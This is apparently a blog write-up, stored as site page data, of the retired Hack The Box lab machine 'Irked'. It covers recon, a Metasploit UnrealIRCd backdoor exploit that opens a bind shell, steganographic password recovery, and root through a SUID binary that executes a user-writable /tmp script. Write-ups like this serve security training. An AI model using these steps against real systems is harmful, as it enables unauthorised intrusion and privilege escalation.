{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240820/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 693px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7cf8728eddbf4f11a852c0f79541482d/ee2da/irked.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 92.1875%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC7klEQVR42oVTyW7TUBTND7RppibObMfjs+OxSeo4aVJKS5EorVCJ2iwixAaEWFQqCwaBWLFhhcQHIPUPWLJiwRYkvuhwnx0VhbZhcXTve/e84zs5la+bWEBjEQWOmoVCNfEXuLWrSOUFcsqEytwWLORzhCKhZCJD8aLCCFbsxzyBYmXresFcZCC3RRgRdnVk72vInCrIPFWQnqnoz2y8ebuD85cROidtrAxlZLsKsqaGrKQj15ijmdhUdpsC90hkJiN9JmLtTELmUQsrBzKMxzZOJwX8uviA75/OMD0V0HpgYSWUsLYtIT0QkfFayKoqiZOOqJHgQ8rmhL56V0WupyPPGAoaQ1pm6B3aePdkjB9fZvj6/h7OpzbcAxerTQMFiyFnU0VdFZk+vQ9U5FUDKcF0UZZ8lBt+YhUfFdWD0Aqgdjx8/Pwcv39W8e2ihlevjyD5AQTOk72EP/cFzYWgeEiVRbpo8cu5naNQbyNdZChTJrMXJibPTJSYhdV1yq7RXuAmwkFsUwuBS2EP0c4h9o+mGO8dIxxPEI6OcWt/gjuHU2yOD1CS3CtJcCwICpIXE0uSDcMfw+ntweqOEAy34Q/oHJKNdqF5AxRFm/juzYJcrK71oDpbUNpjyL4DIzJhBbfRZCEaRkjxTTT0ECKLoNgjtKwhKnJws2BN7UK2h0QkUd+HGTkwN3YgtweQrD4ks0+xKD5zHj+XW8GSkql3xaaL9bqLIk29WPfJdwhejBLFSqLzl9P0lvewRBMX7TbYgKGmufFZ9mxaH5PKZ5Ach0TpLrBgDg1qSxuCuESQQ/OGYF0qp90nQeqr7oN1hlD9EFW+n7Qamj+IObITJjt5k2CF1oA3XGSDuPm8r/xB04jigfAP8LaIrB/zGnS3tOSkbDdGVSVoNChCRXbjaVaVDUInWS/icPtfQT61quqjzigT20Wdfs2mGcRZ6d52bGtq55J7RTAp6x9QWVUaSk13YvB/m2fW0HuXYte+kzz8ATe4GqmeFx/AAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7cf8728eddbf4f11a852c0f79541482d/a59e9/irked.webp 192w,\n/static/7cf8728eddbf4f11a852c0f79541482d/0ca9f/irked.webp 384w,\n/static/7cf8728eddbf4f11a852c0f79541482d/a5a71/irked.webp 693w\"\n              sizes=\"(max-width: 693px) 100vw, 693px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7cf8728eddbf4f11a852c0f79541482d/3b721/irked.png 192w,\n/static/7cf8728eddbf4f11a852c0f79541482d/66595/irked.png 384w,\n/static/7cf8728eddbf4f11a852c0f79541482d/ee2da/irked.png 693w\"\n            sizes=\"(max-width: 693px) 100vw, 693px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7cf8728eddbf4f11a852c0f79541482d/ee2da/irked.png\"\n            alt=\"irked\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h2>1. Machine Info</h2>\n<p>Irked is an easy-rated, retired machine from Hack the Box. And it is fairly rated I would say, even if the privesc part was little tricky if you don’t know what is steganography.</p>\n<p>(machine pic)</p>\n<p>But still, it was a doable machine and I had fun.</p>\n<blockquote>\n<p>As always, let’s dive into the machine!</p>\n</blockquote>\n<h2>2. Recon</h2>\n<p>Starting with initial nmap scan:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">PORT      STATE SERVICE    REASON\r\n22/tcp    open  ssh        syn-ack ttl 63\r\n80/tcp    open  http       syn-ack ttl 63\r\n| http-methods: \r\n|_  Supported Methods: POST OPTIONS GET HEAD\r\n|_http-title: Site doesn't have a title (text/html).\r\n111/tcp   open  rpcbind    syn-ack ttl 63\r\n| rpcinfo: \r\n|   program version    port/proto  service\r\n|   100000  2,3,4        111/tcp   rpcbind\r\n|   100000  2,3,4        111/udp   rpcbind\r\n|   100000  3,4          111/tcp6  rpcbind\r\n|   100000  3,4          111/udp6  rpcbind\r\n|   100024  1          35284/tcp   status\r\n|   100024  1          48441/tcp6  status\r\n|   100024  1          51878/udp   status\r\n|_  100024  1          56479/udp6  status\r\n6697/tcp  open  ircs-u     syn-ack ttl 63\r\n8067/tcp  open  infi-async syn-ack ttl 63\r\n35284/tcp open  status     syn-ack ttl 63\r\n65534/tcp open  unknown    syn-ack ttl 63</code></pre></div>\n<p>So there are several services. Let’s list all of them</p>\n<ul>\n<li>ssh</li>\n<li>http</li>\n<li>rpc</li>\n<li>ircs-u, info-async (6697 and 8067)</li>\n<li>two unknown services (likely out of scope)</li>\n</ul>\n<p>Let’s start our enumeration.</p>\n<h2>3. Enumeration</h2>\n<p>Since ssh is very likely not vulnerable, I’ll start with http</p>\n<h3>3.1 HTTP 80</h3>\n<p>Index page shows just a single photo:</p>\n<p>(potato)</p>\n<p>I tried subdirectory enumeration:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://10.10.10.117/FUZZ -c     \r\n\r\n        /'___\\  /'___\\           /'___\\       \r\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \r\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \r\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \r\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \r\n          \\/_/    \\/_/   \\/___/    \\/_/       \r\n\r\n       v2.1.0-dev\r\n________________________________________________\r\n\r\n :: Method           : GET\r\n :: URL              : http://10.10.10.117/FUZZ\r\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt\r\n :: Follow redirects : false\r\n :: Calibration      : false\r\n :: Timeout          : 10\r\n :: Threads          : 40\r\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\r\n________________________________________________\r\n\r\nmanual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 89ms]\r\nserver-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 100ms]\r\n                        [Status: 200, Size: 72, Words: 5, Lines: 4, Duration: 145ms]\r\n                        [Status: 200, Size: 72, Words: 5, Lines: 4, Duration: 49ms]\r\n:: Progress: [56164/56164] :: Job [1/1] :: 757 req/sec :: Duration: [0:01:56] :: Errors: 1 ::</code></pre></div>\n<p>But nothing was really interesting. Since we also don’t have a dedicated domain name, that’s it for http, I guess.</p>\n<h3>3.2 Port 8067, 6697</h3>\n<p>Port 8067, 6697 have a running service named “irc”</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/irked]\r\n└─$ sudo nmap 10.10.10.117 -p8067 -sC -sV -A\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-17 08:40 EDT\r\nNmap scan report for 10.10.10.117\r\nHost is up (0.074s latency).\r\n\r\nPORT     STATE SERVICE VERSION\r\n8067/tcp open  irc     UnrealIRCd\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.5 (94%), Linux 3.8 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 2 hops\r\nService Info: Host: irked.htb\r\n\r\nTRACEROUTE (using port 8067/tcp)\r\nHOP RTT       ADDRESS\r\n1   64.80 ms  10.10.16.1\r\n2   138.23 ms 10.10.10.117\r\n\r\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 14.06 seconds</code></pre></div>\n<p>I’ll dig deeper into this service, since this is only option.</p>\n<h2>4. Initial Foothold</h2>\n<p>We had the keyword unrealircd. I searched for cve:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ searchsploit unrealirc\r\n--------------------------------------------------------------------------------- ---------------------------------\r\n Exploit Title                                                                   |  Path\r\n--------------------------------------------------------------------------------- ---------------------------------\r\nUnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                     | linux/remote/16922.rb\r\nUnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                          | windows/dos/18011.txt\r\nUnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                   | linux/remote/13853.pl\r\nUnrealIRCd 3.x - Remote Denial of Service                                        | windows/dos/27407.pl\r\n--------------------------------------------------------------------------------- ---------------------------------\r\nShellcodes: No Results</code></pre></div>\n<p>There is a metasploit module. Even if we don’t have version number of current irc session, it’s worth trying it.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 1\r\npayload => cmd/unix/bind_perl\r\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit\r\n\r\n[*] 10.10.10.117:8067 - Connected to 10.10.10.117:8067...\r\n    :irked.htb NOTICE AUTH :*** Looking up your hostname...\r\n[*] 10.10.10.117:8067 - Sending backdoor command...\r\n[*] Started bind TCP handler against 10.10.10.117:4444\r\n[*] Command shell session 1 opened (10.10.16.14:41723 -> 10.10.10.117:4444) at 2024-08-17 08:55:28 -0400\r\n\r\nshell\r\n[*] Trying to find binary 'python' on the target machine\r\n[*] Found python at /usr/bin/python\r\n[*] Using `python` to pop up an interactive shell\r\n[*] Trying to find binary 'bash' on the target machine\r\n[*] Found bash at /bin/bash</code></pre></div>\n<p>I had to struggle for a while to find a suitable payload, but it dropped a shell as user “ircd” at the end.</p>\n<h2>5. Shell as user djmardov</h2>\n<p>Running linenum.sh:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)\r\n-rw-r--r-- 1 root root 29 May 11  2018 /usr/lib/pymodules/python2.7/.path                                          \r\n-rw-r--r-- 1 root root 2396 Apr  4  2018 /usr/lib/jvm/.java-1.7.0-openjdk-i386.jinfo\r\n-rw-r--r-- 1 root root 0 May 11  2018 /etc/.java/.systemPrefs/.systemRootModFile\r\n-rw-r--r-- 1 root root 0 May 11  2018 /etc/.java/.systemPrefs/.system.lock\r\n-rw------- 1 root root 0 May 11  2018 /etc/.pwd.lock\r\n-rw-r--r-- 1 root root 220 Nov  5  2016 /etc/skel/.bash_logout\r\n-rw------- 1 Debian-gdm Debian-gdm 5584 Aug 17 08:28 /var/lib/gdm3/.ICEauthority\r\n-r--r--r-- 1 root root 11 Aug 17 08:28 /tmp/.X0-lock\r\n-rw-r--r-- 1 root root 0 Aug 17 08:27 /run/network/.ifstate.lock\r\n-rw------- 1 ircd ircd 124 Apr 24  2004 /home/ircd/Unreal3.2/.cvsignore\r\n-rw------- 1 ircd ircd 932 Apr 13  2009 /home/ircd/Unreal3.2/.CHANGES.NEW\r\n-rw------- 1 ircd ircd 5623 Apr 13  2009 /home/ircd/Unreal3.2/.RELEASE.NOTES\r\n-rw------- 1 ircd ircd 1645 Apr 24  2004 /home/ircd/Unreal3.2/.CONFIG.RANT\r\n-rw------- 1 ircd ircd 519 Dec 10  2000 /home/ircd/Unreal3.2/.UPDATE\r\n-rw------- 1 ircd ircd 1060 Apr 24  2004 /home/ircd/Unreal3.2/.SICI\r\n-rw------- 1 ircd ircd 794 Aug 20  2000 /home/ircd/Unreal3.2/.indent.pro\r\n-rw-r--r-- 1 ircd ircd 66 May 14  2018 /home/ircd/.selected_editor\r\n-rw-r--r-- 1 djmardov djmardov 52 May 16  2018 /home/djmardov/Documents/.backup\r\n-rw------- 1 djmardov djmardov 4706 Nov  3  2018 /home/djmardov/.ICEauthority\r\n-rw-r--r-- 1 djmardov djmardov 220 May 11  2018 /home/djmardov/.bash_logout</code></pre></div>\n<p>We have a read permission on .backup in djmardov folder. This is indeed suspicious.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">ircd@irked:~/Unreal3.2$ cat /home/djmardov/Documents/.backup\r\ncat /home/djmardov/Documents/.backup\r\nSuper elite steg backup pw\r\nUPupDOWNdownLRlrBAbaSSss</code></pre></div>\n<p>What is steg bacup pw? This was a tricky part. Steg indicates that the password is hidden via steganography.</p>\n<blockquote>\n<p>Steganography is the practice of concealing information within another message or physical object to avoid detection.</p>\n</blockquote>\n<p>Have we seen any images before? yes, the potato photo from 80. I’ll use steghide to extract password out of it.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/oscp/htb-box/irked]\r\n└─$ steghide extract -sf irked.jpg\r\nEnter passphrase: \r\nwrote extracted data to \"pass.txt\".\r\n                                                                                                                   \r\n┌──(hosan㉿kali)-[~/oscp/htb-box/irked]\r\n└─$ cat pass.txt         \r\nKab6h+m+bbp2J:HG</code></pre></div>\n<p>And we could log in via ssh.</p>\n<h2>6. Shell as root</h2>\n<p>I ran linpeas once more. After looking for a while, I found:</p>\n<blockquote>\n<p>-rwsr-xr-x 1 root root 7.2K May 16 2018 /usr/bin/viewuser (Unknown SUID binary!)</p>\n</blockquote>\n<p>Maybe it’s worth digging deeper.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">djmardov@irked:/tmp$ /usr/bin/viewuser\r\nThis application is being devleoped to set and test user permissions\r\nIt is still being actively developed\r\n(unknown) :0           2024-08-17 08:28 (:0)\r\ndjmardov pts/1        2024-08-17 09:22 (10.10.16.14)\r\nsh: 1: /tmp/listusers: not found\r\ndjmardov@irked:/tmp$ </code></pre></div>\n<p>Okay, let’s quickly create listusers  in /tmp to see what happenes with echo “hello” > listuser</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">djmardov@irked:/tmp$ /usr/bin/viewuser\r\nThis application is being devleoped to set and test user permissions\r\nIt is still being actively developed\r\n(unknown) :0           2024-08-17 08:28 (:0)\r\ndjmardov pts/1        2024-08-17 09:22 (10.10.16.14)\r\n/tmp/listusers: 1: /tmp/listusers: hello: not found</code></pre></div>\n<p>So It tries to execute our input. Since there is no script named “hello”, it throws not found error.</p>\n<p>It will give me a shell with /bin/bash.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">djmardov@irked:/tmp$ echo \"/bin/bash\" > listusers\r\ndjmardov@irked:/tmp$ /usr/bin/viewuser\r\nThis application is being devleoped to set and test user permissions\r\nIt is still being actively developed\r\n(unknown) :0           2024-08-17 08:28 (:0)\r\ndjmardov pts/1        2024-08-17 09:22 (10.10.16.14)\r\nroot@irked:/tmp# djmardov@irked:</code></pre></div>\n<p>We got root. Done!</p>\n<h2>7. Source</h2>\n<ul>\n<li>HTB 2024</li>\n<li>Me!</li>\n</ul>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>Hack The Box 2024</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Hack The Box Irked","summary":"Solving \"Irked\" machine from HTB","date":"2024.08.20.","before":"2024.08.19.","after":"2024.08.25.","categories":["C-SEC","hackthebox","pentest","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC7klEQVR42oVTyW7TUBTND7RppibObMfjs+OxSeo4aVJKS5EorVCJ2iwixAaEWFQqCwaBWLFhhcQHIPUPWLJiwRYkvuhwnx0VhbZhcXTve/e84zs5la+bWEBjEQWOmoVCNfEXuLWrSOUFcsqEytwWLORzhCKhZCJD8aLCCFbsxzyBYmXresFcZCC3RRgRdnVk72vInCrIPFWQnqnoz2y8ebuD85cROidtrAxlZLsKsqaGrKQj15ijmdhUdpsC90hkJiN9JmLtTELmUQsrBzKMxzZOJwX8uviA75/OMD0V0HpgYSWUsLYtIT0QkfFayKoqiZOOqJHgQ8rmhL56V0WupyPPGAoaQ1pm6B3aePdkjB9fZvj6/h7OpzbcAxerTQMFiyFnU0VdFZk+vQ9U5FUDKcF0UZZ8lBt+YhUfFdWD0Aqgdjx8/Pwcv39W8e2ihlevjyD5AQTOk72EP/cFzYWgeEiVRbpo8cu5naNQbyNdZChTJrMXJibPTJSYhdV1yq7RXuAmwkFsUwuBS2EP0c4h9o+mGO8dIxxPEI6OcWt/gjuHU2yOD1CS3CtJcCwICpIXE0uSDcMfw+ntweqOEAy34Q/oHJKNdqF5AxRFm/juzYJcrK71oDpbUNpjyL4DIzJhBbfRZCEaRkjxTTT0ECKLoNgjtKwhKnJws2BN7UK2h0QkUd+HGTkwN3YgtweQrD4ks0+xKD5zHj+XW8GSkql3xaaL9bqLIk29WPfJdwhejBLFSqLzl9P0lvewRBMX7TbYgKGmufFZ9mxaH5PKZ5Ach0TpLrBgDg1qSxuCuESQQ/OGYF0qp90nQeqr7oN1hlD9EFW+n7Qamj+IObITJjt5k2CF1oA3XGSDuPm8r/xB04jigfAP8LaIrB/zGnS3tOSkbDdGVSVoNChCRXbjaVaVDUInWS/icPtfQT61quqjzigT20Wdfs2mGcRZ6d52bGtq55J7RTAp6x9QWVUaSk13YvB/m2fW0HuXYte+kzz8ATe4GqmeFx/AAAAAAElFTkSuQmCC"},"images":{"fallback":{"src":"/static/7cf8728eddbf4f11a852c0f79541482d/6859d/irked.png","srcSet":"/static/7cf8728eddbf4f11a852c0f79541482d/f8834/irked.png 173w,\n/static/7cf8728eddbf4f11a852c0f79541482d/a6174/irked.png 347w,\n/static/7cf8728eddbf4f11a852c0f79541482d/6859d/irked.png 693w","sizes":"(min-width: 693px) 693px, 100vw"},"sources":[{"srcSet":"/static/7cf8728eddbf4f11a852c0f79541482d/82fcb/irked.webp 173w,\n/static/7cf8728eddbf4f11a852c0f79541482d/4f422/irked.webp 347w,\n/static/7cf8728eddbf4f11a852c0f79541482d/ab6c7/irked.webp 693w","type":"image/webp","sizes":"(min-width: 693px) 693px, 100vw"}]},"width":693,"height":640}},"publicURL":"/static/7cf8728eddbf4f11a852c0f79541482d/irked.png"}}}}]}},"pageContext":{"slug":"/240820/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}